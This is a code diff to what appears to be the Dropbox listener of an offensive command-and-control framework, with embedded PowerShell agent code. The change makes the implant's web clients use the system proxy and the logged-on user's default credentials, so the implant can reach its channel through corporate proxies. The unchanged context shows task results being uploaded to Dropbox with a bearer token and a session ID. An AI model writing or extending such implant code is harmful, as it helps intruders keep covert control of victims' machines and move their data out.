@@ -528,7 +528,12 @@ class Listener:
             $wc = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = $Script:Proxy;
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add("User-Agent", $script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -569,7 +574,12 @@ class Listener:
             # build the web request object
             $wc = New-Object System.Net.WebClient
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = $Script:Proxy;
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -591,7 +601,12 @@ class Listener:
                 }
 
                 $wc2 = New-Object System.Net.WebClient
-                $wc2.Proxy = $Script:Proxy;
+                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                if($Script:Proxy) {
+                    $wc2.Proxy = $Script:Proxy;
+                }
+                
                 $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                 $wc2.Headers.Add("Content-Type", "application/octet-stream")
                 $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
